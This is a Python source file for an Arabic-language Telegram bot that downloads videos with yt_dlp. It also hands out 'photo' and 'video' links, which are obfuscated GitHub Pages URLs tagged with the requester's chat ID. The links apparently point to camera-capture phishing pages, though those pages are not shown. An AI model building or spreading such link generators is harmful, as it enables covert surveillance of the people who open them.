import os
import telebot
from telebot import types
import threading
import http.server
import yt_dlp
import logging

# تفعيل تسجيل الأخطاء لرؤية أي مشكلة في الـ Logs
logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    print("❌ خطأ: لم يتم إعداد BOT_TOKEN في البيئة.")
    exit()

bot = telebot.TeleBot(BOT_TOKEN)

# الروابط
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

# --- دالة التحميل المباشرة (بدون أي اعتماد على ملفات خارجية) ---
def download_video_robust(url, chat_id):
    file_path = f'/tmp/vid_{chat_id}.mp4'
    
    # خيارات محسنة لتحميل قوي بدون كوكيز
    ydl_opts = {
        'format': 'best',
        'outtmpl': file_path,
        'quiet': True,
        'no_warnings': True,
        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }
    
    try:
        # حذف أي ملف قديم
        if os.path.exists(file_path): 
            os.remove(file_path)
            
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            return file_path, info.get('title', 'Video')
    except Exception as e:
        return None, str(e)

# --- الواجهة ---
def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ رابط صور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 رابط فيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو", callback_data="dl_video"),
        types.InlineKeyboardButton("🌐 أخبار وبث مباشر", callback_data="news_menu")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "👋 أهلاً بك، البوت يعمل بكامل طاقته!", reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    if call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("📥 أرسل رابط الفيديو الآن:", chat_id, call.message.message_id)
    elif call.data == "main_menu":
        bot.edit_message_text("🤖 القائمة الرئيسية:", chat_id, call.message.message_id, reply_markup=get_main_keyboard())
    elif call.data == "get_photo_link": bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_video_link": bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    chat_id = message.chat.id
    if user_states.get(chat_id) == "waiting_for_url":
        status_msg = bot.reply_to(message, "⏳ جاري التحميل... يرجى الانتظار")
        
        path, title = download_video_robust(message.text, chat_id)
        
        if path and os.path.exists(path):
            with open(path, 'rb') as video:
                bot.send_video(chat_id, video, caption=title)
            bot.delete_message(chat_id, status_msg.message_id)
            if os.path.exists(path): os.remove(path)
        else:
            bot.edit_message_text(f"❌ فشل التحميل:\n{title}\n(ربما الفيديو خاص أو الرابط غير مدعوم)", chat_id, status_msg.message_id)
        
        user_states[chat_id] = None

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    # استخدام infinity_polling لضمان عدم توقف البوت عند حدوث خطأ بسيط
    print("🤖 البوت يعمل الآن...")
    bot.infinity_polling()
